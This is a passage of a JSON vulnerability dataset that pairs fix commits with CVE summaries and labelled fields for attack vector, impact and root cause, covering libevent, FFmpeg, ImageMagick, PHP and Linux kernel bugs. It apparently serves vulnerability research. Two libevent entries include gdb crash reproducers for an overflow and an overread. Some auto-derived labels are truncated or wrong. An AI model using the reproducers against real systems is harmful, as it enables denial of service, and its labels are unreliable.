malloc(sizeof(struct sockaddr))\n  # $2 = (void *) 0x646010\n  p malloc(sizeof(int))\n  # $3 = (void *) 0x646030\n  p malloc($1)\n  # $4 = (void *) 0x7fff76a2a010\n  p memset($4, 1, $1)\n  # $5 = 1990369296\n  p (char *)$4\n  # $6 = 0x7fff76a2a010 '\\001' <repeats 200 times>...\n  set $6[0]='['\n  set $6[$1]=']'\n  p evutil_parse_sockaddr_port($4, $2, $3)\n  # $7 = -1\n\nBefore:\n  $ gdb bin\/http-connect < gdb\n  (gdb) $1 = 2147483649\n  (gdb) (gdb) $2 = (void *) 0x646010\n  (gdb) (gdb) $3 = (void *) 0x646030\n  (gdb) (gdb) $4 = (void *) 0x7fff76a2a010\n  (gdb) (gdb) $5 = 1990369296\n  (gdb) (gdb) $6 = 0x7fff76a2a010 '\\001' <repeats 200 times>...\n  (gdb) (gdb) (gdb) (gdb)\n  Program received signal SIGSEGV, Segmentation fault.\n  __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:36\n\nAfter:\n  $ gdb bin\/http-connect < gdb\n  (gdb) $1 = 2147483649\n  (gdb) (gdb) $2 = (void *) 0x646010\n  (gdb) (gdb) $3 = (void *) 0x646030\n  (gdb) (gdb) $4 = (void *) 0x7fff76a2a010\n  (gdb) (gdb) $5 = 1990369296\n  (gdb) (gdb) $6 = 0x7fff76a2a010 '\\001' <repeats 200 times>...\n  (gdb) (gdb) (gdb) (gdb) $7 = -1\n  (gdb) (gdb) quit\n\nFixes: #318","summary":"Stack-based buffer overflow in the evutil_parse_sockaddr_port function in evutil.c in libevent before 2.1.6-beta allows attackers to cause a denial of service (segmentation fault) via vectors involving a long string in brackets in the ip_as_string argument.","commit_message_1":"fix buffer overflow @ asn-the-goblin-slayer : `` length between ' [ ' and ' ] ' is cast to signed <number> bit integer on line <number>","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving a long string in brackets in the ip _ as _ string argument","Impact":"cause a denial of service ( segmentation fault )","Root Cause":"caused by a stack-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"96f64a022014a208105ead6c8a7066018449d86d","cve_id":"CVE-2016-10195","cwe_id":"CWE-125","commit_message":"evdns: name_parse(): fix remote stack overread\n\n@asn-the-goblin-slayer:\n  \"the name_parse() function in libevent's DNS code is vulnerable to a buffer overread.\n\n   971         if (cp != name_out) {\n   972             if (cp + 1 >= end) return -1;\n   973             *cp++ = '.';\n   974         }\n   975         if (cp + label_len >= end) return -1;\n   976         memcpy(cp, packet + j, label_len);\n   977         cp += label_len;\n   978         j += label_len;\n   No check is made against length before the memcpy occurs.\n\n   This was found through the Tor bug bounty program and the discovery should be credited to 'Guido Vranken'.\"\n\nReproducer for gdb (https:\/\/gist.github.com\/azat\/e4fcf540e9b89ab86d02):\n  set $PROT_NONE=0x0\n  set $PROT_READ=0x1\n  set $PROT_WRITE=0x2\n  set $MAP_ANONYMOUS=0x20\n  set $MAP_SHARED=0x01\n  set $MAP_FIXED=0x10\n  set $MAP_32BIT=0x40\n\n  start\n\n  set $length=202\n  # overread\n  set $length=2\n  # allocate with mmap to have a seg fault on page boundary\n  set $l=(1<<20)*2\n  p mmap(0, $l, $PROT_READ|$PROT_WRITE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_32BIT, -1, 0)\n  set $packet=(char *)$1+$l-$length\n  # hack the packet\n  set $packet[0]=63\n  set $packet[1]='\/'\n\n  p malloc(sizeof(int))\n  set $idx=(int *)$2\n  set $idx[0]=0\n  set $name_out_len=202\n\n  p malloc($name_out_len)\n  set $name_out=$3\n\n  # have WRITE only mapping to fail on read\n  set $end=$1+$l\n  p (void *)mmap($end, 1<<12, $PROT_NONE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_FIXED|$MAP_32BIT, -1, 0)\n  set $m=$4\n\n  p name_parse($packet, $length, $idx, $name_out, $name_out_len)\n  x\/2s (char *)$name_out\n\nBefore this patch:\n$ gdb -ex 'source gdb' dns-example\n$1 = 1073741824\n$2 = (void *) 0x633010\n$3 = (void *) 0x633030\n$4 = (void *) 0x40200000\n\nProgram received signal SIGSEGV, Segmentation fault.\n__memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:33\n\nAfter this patch:\n$ gdb -ex 'source gdb' dns-example\n$1 = 1073741824\n$2 = (void *) 0x633010\n$3 = (void *) 0x633030\n$4 = (void *) 0x40200000\n$5 = -1\n0x633030:       \"\/\"\n0x633032:       \"\"\n(gdb) p $m\n$6 = (void *) 0x40200000\n(gdb) p $1\n$7 = 1073741824\n(gdb) p\/x $1\n$8 = 0x40000000\n(gdb) quit\n\nP.S. plus drop one condition duplicate.\n\nFixes: #317","summary":"The name_parse function in evdns.c in libevent before 2.1.6-beta allows remote attackers to have unspecified impact via vectors involving the label_len variable, which triggers an out-of-bounds stack read.","commit_message_1":"name_parse ( ) : fix remote stack overread @ asn-the-goblin-slayer : `` the name_parse ( ) function in libevent 's dns code is vulnerable to a buffer overread","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via vectors involving the label _ len variable , which triggers an out - of - bounds stack read","Impact":"have unspecified impact","Root Cause":"caused by out-of-bounds","Attack Type":"remote attacker"},{"commit_id":"a5d25faa3f4b18dac737fdb35d0dd68eb0dc2156","cve_id":"CVE-2016-10192","cwe_id":"CWE-119","commit_message":"ffserver: Check chunk size\n\nFixes out of array access\n\nFixes: poc_ffserver.py\nFound-by: Paul Cher <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Heap-based buffer overflow in ffserver.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote attackers to execute arbitrary code by leveraging failure to check chunk size.","commit_message_1":"ffserver : check chunk size","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging failure to check chunk size","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the ffserver.c","Attack Type":"remote attacker"},{"commit_id":"7d57ca4d9a75562fa32e40766211de150f8b3ee7","cve_id":"CVE-2016-10191","cwe_id":"CWE-119","commit_message":"avformat\/rtmppkt: Check for packet size mismatches\n\nFixes out of array access\n\nFound-by: Paul Cher <paulcher@icloud.com>\nReviewed-by: Paul Cher <paulcher@icloud.com>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"Heap-based buffer overflow in libavformat\/rtmppkt.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote attackers to execute arbitrary code by leveraging failure to check for RTMP packet size mismatches.","commit_message_1":"check for packet size mismatch fix out of array access","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging failure to check for rtmp packet size mismatches","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the libavformat\/rtmppkt.c","Attack Type":"remote attacker"},{"commit_id":"2a05c8f813de6f2278827734bf8102291e7484aa","cve_id":"CVE-2016-10190","cwe_id":"CWE-119","commit_message":"http: make length\/offset-related variables unsigned.\n\nFixes #5992, reported and found by Paul Cher <paulcher@icloud.com>.","summary":"Heap-based buffer overflow in libavformat\/http.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote web servers to execute arbitrary code via a negative chunk size in an HTTP response.","commit_message_1":"make length\/offset-related variable unsigned","Vulnerability Type":"buffer overflow","Attack Vector":"via a negative chunk size in an http response","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the libavformat\/http.c","Attack Type":"remote attacker"},{"commit_id":"701ab8129ba9ea64f569daedca9a8603abad740f","cve_id":"CVE-2016-10189","cwe_id":"CWE-476","commit_message":"imcb_file_send_start: handle ft attempts from non-existing users","summary":"BitlBee before 3.5 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) and possibly execute arbitrary code via a file transfer request for a contact that is not in the contact list.","commit_message_1":"imcb_file_send_start : handle ft attempt from non-existing user","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a file transfer request for a contact that is not in the contact list","Impact":"cause a denial of service ( pointer dereference and crash ) and possibly execute arbitrary code","Root Cause":"caused by a NULL pointer dereference error","Attack Type":"remote attacker"},{"commit_id":"4bc05fc490b66ef2d45b1de26abf1455b486b0dc","cve_id":"CVE-2016-10172","cwe_id":"CWE-125","commit_message":"fixes for 4 fuzz failures posted to SourceForge mailing list","summary":"The read_new_config_info function in open_utils.c in Wavpack before 5.1.0 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted WV file.","commit_message_1":"fix for <number> fuzz failure posted to sourceforge mailing list","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted wv file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"69d2fd2c597ffc0c217de1238b9bf4d4bceba8e6","cve_id":"CVE-2016-10168","cwe_id":"CWE-190","commit_message":"Fix #354: Signed Integer Overflow gd_io.c\n\nGD2 stores the number of horizontal and vertical chunks as words (i.e. 2\nbyte unsigned). These values are multiplied and assigned to an int when\nreading the image, what can cause integer overflows. We have to avoid\nthat, and also make sure that either chunk count is actually greater\nthan zero. If illegal chunk counts are detected, we bail out from\nreading the image.","summary":"Integer overflow in gd_io.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to have unspecified impact via vectors involving the number of horizontal and vertical chunks in an image.","commit_message_1":"signed integer overflow <file> gd2 store the number of horizontal and vertical chunk a word ( <file>","Vulnerability Type":"integer overflow","Attack Vector":"via vectors involving the number of horizontal and vertical chunks in an image","Impact":"have unspecified impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"fe9ed49dafa993e3af96b6a5a589efeea9bfb36f","cve_id":"CVE-2016-10167","cwe_id":"CWE-20","commit_message":"Fix DOS vulnerability in gdImageCreateFromGd2Ctx()\n\nWe must not pretend that there are image data if there are none. Instead\nwe fail reading the image file gracefully.","summary":"The gdImageCreateFromGd2Ctx function in gd_gd2.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to cause a denial of service (application crash) via a crafted image file.","commit_message_1":"fix do vulnerability in gdimagecreatefromgd2ctx ( ) we must not pretend that there are image data if there are none","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted image file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"60bfb401ad5a4a8ae995dcd36372fe15c71e1a35","cve_id":"CVE-2016-10166","cwe_id":"CWE-191","commit_message":"Fix potential unsigned underflow\n\nNo need to decrease `u`, so we don't do it. While we're at it, we also factor\nout the overflow check of the loop, what improves performance and readability.\n\nThis issue has been reported by Stefan Esser to security@libgd.org.","summary":"Integer underflow in the _gdContributionsAlloc function in gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.2.4 allows remote attackers to have unspecified impact via vectors related to decrementing the u variable.","commit_message_1":"fix potential unsigned underflow no need to decrease ` u ` , so we do n't do it","Vulnerability Type":"integer underflow","Attack Vector":"via vectors related to decrementing the u variable","Impact":"have unspecified impact","Root Cause":"caused by an integer underflow","Attack Type":"remote attacker"},{"commit_id":"5ca71a7bc18b6897ab21d815d15e218e204581e2","cve_id":"CVE-2016-10165","cwe_id":"CWE-125","commit_message":"Added an extra check to MLU bounds\n\nThanks to Ibrahim el-sayed for spotting the bug","summary":"The Type_MLU_Read function in cmstypes.c in Little CMS (aka lcms2) allows remote attackers to obtain sensitive information or cause a denial of service via an image with a crafted ICC profile, which triggers an out-of-bounds heap read.","commit_message_1":"added an extra check to mlu bound","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an image with a crafted icc profile , which triggers an out - of - bounds heap read","Impact":"obtain sensitive information or cause a denial of service","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"8d2539fa0faf3f63e1d1e7635347c5b9e777d47b","cve_id":"CVE-2016-10162","cwe_id":"CWE-476","commit_message":"Fix bug #73831 - NULL Pointer Dereference while unserialize php object","summary":"The php_wddx_pop_element function in ext\/wddx\/wddx.c in PHP 7.0.x before 7.0.15 and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an inapplicable class name in a wddxPacket XML document, leading to mishandling in a wddx_deserialize call.","commit_message_1":"fix bug # <number> - null pointer dereference while unserialize php object","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an inapplicable class name in a wddxpacket xml document , leading to mishandling in a wddx _ deserialize","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"16b3003ffc6393e250f069aa28a78dc5a2c064b2","cve_id":"CVE-2016-10161","cwe_id":"CWE-125","commit_message":"Fix bug #73825 - Heap out of bounds read on unserialize in finish_nested_data()","summary":"The object_common1 function in ext\/standard\/var_unserializer.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (buffer over-read and application crash) via crafted serialized data that is mishandled in a finish_nested_data call.","commit_message_1":"fix bug # <number> - heap out of bound read on unserialize in finish_nested_data ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted serialized data that is mishandled in a finish _ nested _ data call ","Impact":"cause a denial of service ( buffer over - read and application crash )","Root Cause":"caused by a buffer over-read issue","Attack Type":"remote attacker"},{"commit_id":"b28b8b2fee6dfa6fcd13305c581bb835689ac3be","cve_id":"CVE-2016-10160","cwe_id":"CWE-119","commit_message":"Fix bug #73768 - Memory corruption when loading hostile phar","summary":"Off-by-one error in the phar_parse_pharfile function in ext\/phar\/phar.c in PHP before 5.6.30 and 7.0.x before 7.0.15 allows remote attackers to cause a denial of service (memory corruption) or possibly execute arbitrary code via a crafted PHAR archive with an alias mismatch.","commit_message_1":"fix bug # <number> - memory corruption when loading hostile phar","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted phar archive with an alias mismatch","Impact":"cause a denial of service ( memory corruption ) or possibly execute arbitrary code","Root Cause":"caused by an off-by-one error","Attack Type":"remote attacker"},{"commit_id":"1cda0d7c2ffb62d8331c64e703131d9cabdc03ea","cve_id":"CVE-2016-10158","cwe_id":"CWE-189","commit_message":"Fix bug #73737 FPE when parsing a tag format","summary":"The exif_convert_any_to_int function in ext\/exif\/exif.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (application crash) via crafted EXIF data that triggers an attempt to divide the minimum representable negative integer by -1.","commit_message_1":"fix bug # <number> fpe when parsing a tag format","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted exif data that triggers an attempt to divide the minimum representable negative integer by - 1","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an off-by-one error","Attack Type":"remote attacker"},{"commit_id":"06eeacb6fe029804f296b065b3ce91e796e1cd0e","cve_id":"CVE-2016-10156","cwe_id":"CWE-264","commit_message":"basic: fix touch() creating files with 07777 mode\n\nmode_t is unsigned, so MODE_INVALID < 0 can never be true.\n\nThis fixes a possible DoS where any user could fill \/run by writing to\na world-writable \/run\/systemd\/show-status.","summary":"A flaw in systemd v228 in \/src\/basic\/fs-util.c caused world writable suid files to be created when using the systemd timers features, allowing local attackers to escalate their privileges to root. This is fixed in v229.","commit_message_1":"fix touch ( ) creating file with <number> mode mode_t is unsigned , so mode_invalid < <number> can never be true","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By creating world writable suid files when using the systemd timers","Impact":"escalate their privileges to root","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"06deeec77a5a689cc94b21a8a91a76e42176685d","cve_id":"CVE-2016-10154","cwe_id":"CWE-119","commit_message":"cifs: Fix smbencrypt() to stop pointing a scatterlist at the stack\n\nsmbencrypt() points a scatterlist to the stack, which is breaks if\nCONFIG_VMAP_STACK=y.\n\nFix it by switching to crypto_cipher_encrypt_one().  The new code\nshould be considerably faster as an added benefit.\n\nThis code is nearly identical to some code that Eric Biggers\nsuggested.\n\nCc: stable@vger.kernel.org # 4.9 only\nReported-by: Eric Biggers <ebiggers3@gmail.com>\nSigned-off-by: Andy Lutomirski <luto@kernel.org>\nAcked-by: Jeff Layton <jlayton@redhat.com>\nSigned-off-by: Steve French <smfrench@gmail.com>","summary":"The smbhash function in fs\/cifs\/smbencrypt.c in the Linux kernel 4.9.x before 4.9.1 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a scatterlist.","commit_message_1":"fix smbencrypt ( ) to stop pointing a scatterlist at the stack smbencrypt ( ) point a scatterlist to the stack , which is break if config_vmap_stack=y","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging use of more than one virtual page for a scatterlist","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by the smbhash function","Attack Type":"local attacker"},{"commit_id":"a45f795c65b479b4ba107b6ccde29b896d51ee98","cve_id":"CVE-2016-10153","cwe_id":"CWE-399","commit_message":"libceph: introduce ceph_crypt() for in-place en\/decryption\n\nStarting with 4.9, kernel stacks may be vmalloced and therefore not\nguaranteed to be physically contiguous; the new CONFIG_VMAP_STACK\noption is enabled by default on x86.  This makes it invalid to use\non-stack buffers with the crypto scatterlist API, as sg_set_buf()\nexpects a logical address and won't work with vmalloced addresses.\n\nThere isn't a different (e.g. kvec-based) crypto API we could switch\nnet\/ceph\/crypto.c to and the current scatterlist.h API isn't getting\nupdated to accommodate this use case.  Allocating a new header and\npadding for each operation is a non-starter, so do the en\/decryption\nin-place on a single pre-assembled (header + data + padding) heap\nbuffer.  This is explicitly supported by the crypto API:\n\n    \"... the caller may provide the same scatter\/gather list for the\n     plaintext and cipher text. After the completion of the cipher\n     operation, the plaintext data is replaced with the ciphertext data\n     in case of an encryption and vice versa for a decryption.\"\n\nSigned-off-by: Ilya Dryomov <idryomov@gmail.com>\nReviewed-by: Sage Weil <sage@redhat.com>","summary":"The crypto scatterlist API in the Linux kernel 4.9.x before 4.9.6 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging reliance on earlier net\/ceph\/crypto.c code.","commit_message_1":"introduce ceph_crypt ( ) for in-place en\/decryption starting with <file> , kernel stack may be vmalloced and therefore not guaranteed to be physically contiguous ; the new config_vmap_stack option is enabled by default on x86","Vulnerability Type":"Resource Management Errors","Attack Vector":"by leveraging reliance on earlier net \/ ceph \/ crypto . c code","Impact":"cause a denial of service ( system crash or memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by the lack of an EOF (End of File) check","Attack Type":"local attacker"},{"commit_id":"a0f1d21c1ccb1da66629627a74059dd7f5ac9c61","cve_id":"CVE-2016-10150","cwe_id":"CWE-416","commit_message":"KVM: use after free in kvm_ioctl_create_device()\n\nWe should move the ops->destroy(dev) after the list_del(&dev->vm_node)\nso that we don't use \"dev\" after freeing it.\n\nFixes: a28ebea2adc4 (\"KVM: Protect device ops->create and list_add with kvm->lock\")\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: David Hildenbrand <david@redhat.com>\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>","summary":"Use-after-free vulnerability in the kvm_ioctl_create_device function in virt\/kvm\/kvm_main.c in the Linux kernel before 4.8.13 allows host OS users to cause a denial of service (host OS crash) or possibly gain privileges via crafted ioctl calls on the \/dev\/kvm device.","commit_message_1":"use after free in kvm_ioctl_create_device ( ) we should move the ops- > destroy ( dev ) after the list_del ( & dev- > vm_node ) so that we do n't use `` dev '' after freeing it","Vulnerability Type":"Use After Free","Attack Vector":"via crafted ioctl calls on the \/ dev \/ kvm device","Impact":"cause a denial of service ( host os crash ) or possibly gain privileges","Root Cause":"caused by a use-after-free","Attack Type":"local attacker"},{"commit_id":"48a992727d82cb7db076fa15d372178743b1f4cd","cve_id":"CVE-2016-10147","cwe_id":"CWE-476","commit_message":"crypto: mcryptd - Check mcryptd algorithm compatibility\n\nAlgorithms not compatible with mcryptd could be spawned by mcryptd\nwith a direct crypto_alloc_tfm invocation using a \"mcryptd(alg)\" name\nconstruct.  This causes mcryptd to crash the kernel if an arbitrary\n\"alg\" is incompatible and not intended to be used with mcryptd.  It is\nan issue if AF_ALG tries to spawn mcryptd(alg) to expose it externally.\nBut such algorithms must be used internally and not be exposed.\n\nWe added a check to enforce that only internal algorithms are allowed\nwith mcryptd at the time mcryptd is spawning an algorithm.\n\nLink: http:\/\/marc.info\/?l=linux-crypto-vger&m=148063683310477&w=2\nCc: stable@vger.kernel.org\nReported-by: Mikulas Patocka <mpatocka@redhat.com>\nSigned-off-by: Tim Chen <tim.c.chen@linux.intel.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"crypto\/mcryptd.c in the Linux kernel before 4.8.15 allows local users to cause a denial of service (NULL pointer dereference and system crash) by using an AF_ALG socket with an incompatible algorithm, as demonstrated by mcryptd(md5).","commit_message_1":"mcryptd - check mcryptd algorithm compatibility algorithm not compatible with mcryptd could be spawned by mcryptd with a direct crypto_alloc_tfm invocation using a `` mcryptd ( alg ) '' name construct","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by using an af _ alg socket with an incompatible algorithm , as demonstrated by mcryptd ( md5 )","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"aeff00de228bc5a158c2a975ab47845d8a1db456","cve_id":"CVE-2016-10146","cwe_id":"CWE-399","commit_message":"Fix a small memory leak","summary":"Multiple memory leaks in the caption and label handling code in ImageMagick allow remote attackers to cause a denial of service (memory consumption) via unspecified vectors.","commit_message_1":"fix a small memory leak","Vulnerability Type":"Resource Management Errors","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"9a64e62f0f20c9cf9b2e1609f037060eb2d8eb22","cve_id":"CVE-2016-10130","cwe_id":"CWE-284","commit_message":"http: check certificate validity before clobbering the error variable","summary":"The http_connect function in transports\/http.c in libgit2 before 0.24.6 and 0.25.x before 0.25.1 might allow man-in-the-middle attackers to spoof servers by leveraging clobbering of the error variable.","commit_message_1":"http : check certificate validity before clobbering the error variable","Vulnerability Type":"Improper Access Control","Attack Vector":"by leveraging clobbering of the error variable","Impact":"spoof servers","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"2fdef641fd0dd2828bd948234ae86de75221a11a","cve_id":"CVE-2016-10129","cwe_id":"CWE-476","commit_message":"smart_pkt: treat empty packet lines as error\n\nThe Git protocol does not specify what should happen in the case\nof an empty packet line (that is a packet line \"0004\"). We\ncurrently indicate success, but do not return a packet in the\ncase where we hit an empty line. The smart protocol was not\nprepared to handle such packets in all cases, though, resulting\nin a `NULL` pointer dereference.\n\nFix the issue by returning an error instead. As such kind of\npackets is not even specified by upstream, this is the right\nthing to do.","summary":"The Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to cause a denial of service (NULL pointer dereference) via an empty packet line.","commit_message_1":"treat empty packet line a error the git protocol doe not specify what should happen in the case of an empty packet line ( that is a packet line `` <number> '' )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an empty packet line","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"66e3774d279672ee51c3b54545a79d20d1ada834","cve_id":"CVE-2016-10128","cwe_id":"CWE-119","commit_message":"smart_pkt: verify packet length exceeds PKT_LEN_SIZE\n\nEach packet line in the Git protocol is prefixed by a four-byte\nlength of how much data will follow, which we parse in\n`git_pkt_parse_line`. The transmitted length can either be equal\nto zero in case of a flush packet or has to be at least of length\nfour, as it also includes the encoded length itself. Not\nchecking this may result in a buffer overflow as we directly pass\nthe length to functions which accept a `size_t` length as\nparameter.\n\nFix the issue by verifying that non-flush packets have at least a\nlength of `PKT_LEN_SIZE`.","summary":"Buffer overflow in the git_pkt_parse_line function in transports\/smart_pkt.c in the Git Smart Protocol support in libgit2 before 0.24.6 and 0.25.x before 0.25.1 allows remote attackers to have unspecified impact via a crafted non-flush packet.","commit_message_1":"verify packet length exceeds pkt_len_size each packet line in the git protocol is prefixed by a four-byte length of how much data will follow , which we parse in ` git_pkt_parse_line `","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted non - flush packet","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by the git_pkt_parse_line function","Attack Type":"remote attacker"},{"commit_id":"c7153361a4041260719b340f73f2f76","cve_id":"CVE-2016-10094","cwe_id":"CWE-189","commit_message":"* tools\/tiff2pdf.c: avoid potential heap-based overflow in\nt2p_readwrite_pdf_image_tile().\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2640","summary":"Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools\/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.","commit_message_1":"avoid potential heap-based overflow in t2p_readwrite_pdf_image_tile ( )","Vulnerability Type":"Off-by-one error","Attack Vector":"via a crafted image","Impact":"cause a denial of service","Root Cause":"caused by an off-by-one error flaw","Attack Type":"remote attacker"},{"commit_id":"787c0ee906430b772f33ca50b97b8b5ca070faec","cve_id":"CVE-2016-10093","cwe_id":"CWE-190","commit_message":"* tools\/tiffcp.c: fix uint32 underflow\/overflow that can cause heap-based\nbuffer overflow.\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2610","summary":"Integer overflow in tools\/tiffcp.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image, which triggers a heap-based buffer overflow.","commit_message_1":"fix uint32 underflow\/overflow that can cause heap-based buffer overflow","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image , which triggers a heap - based buffer overflow","Impact":"have unspecified impact","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"f3b483e8b054c50149912523b4773687e18afe25","cve_id":"CVE-2016-10071","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/131","summary":"coders\/mat.c in ImageMagick before 6.9.4-0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted mat file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted mat file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"b173a352397877775c51c9a0e9d59eb6ce24c455","cve_id":"CVE-2016-10070","cwe_id":"CWE-125","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/131","summary":"Heap-based buffer overflow in the CalcMinMax function in coders\/mat.c in ImageMagick before 6.9.4-0 allows remote attackers to cause a denial of service (out-of-bounds read and application crash) via a crafted mat file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted mat file","Impact":"cause a denial of service ( out - of - bounds read and application crash )","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote attacker"},{"commit_id":"8a370f9ab120faf182aa160900ba692ba8e2bcf0","cve_id":"CVE-2016-10069","cwe_id":"CWE-20","commit_message":"Added check for invalid number of frames.","summary":"coders\/mat.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via a mat file with an invalid number of frames.","commit_message_1":"added check for invalid number of frame","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a mat file with an invalid number of frames","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by the failure to check the invalid number of frames by coders\/mat.c","Attack Type":"remote attacker"},{"commit_id":"56d6e20de489113617cbbddaf41e92600a34db22","cve_id":"CVE-2016-10068","cwe_id":"CWE-20","commit_message":"Prevent fault in MSL interpreter","summary":"The MSL interpreter in ImageMagick before 6.9.6-4 allows remote attackers to cause a denial of service (segmentation fault and application crash) via a crafted XML file.","commit_message_1":"prevent fault in msl interpreter","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted xml file","Impact":"cause a denial of service ( segmentation fault and application crash )","Root Cause":"caused by an","Attack Type":"remote attacker"},{"commit_id":"0474237508f39c4f783208123431815f1ededb76","cve_id":"CVE-2016-10067","cwe_id":"CWE-119","commit_message":"Suspend exception processing if there are too many exceptions","summary":"magick\/memory.c in ImageMagick before 6.9.4-5 allows remote attackers to cause a denial of service (application crash) via vectors involving *too many exceptions,* which trigger a buffer overflow.","commit_message_1":"suspend exception processing if there are too many exception","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors involving * too many exceptions , * which trigger a buffer overflow","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by multiple buffer overflows","Attack Type":"remote attacker"},{"commit_id":"134463b926fa965571aa4febd61b810be5e7da05","cve_id":"CVE-2016-10065","cwe_id":"CWE-284","commit_message":"https:\/\/github.com\/ImageMagick\/ImageMagick\/issues\/129","summary":"The ReadVIFFImage function in coders\/viff.c in ImageMagick before 7.0.1-0 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.","commit_message_1":"http : \/\/<file>\/imagemagick\/imagemagick\/issues\/<number>","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( application crash ) or have other unspecified impact","Root Cause":"caused by an out-of-bounds read error","Attack Type":"remote 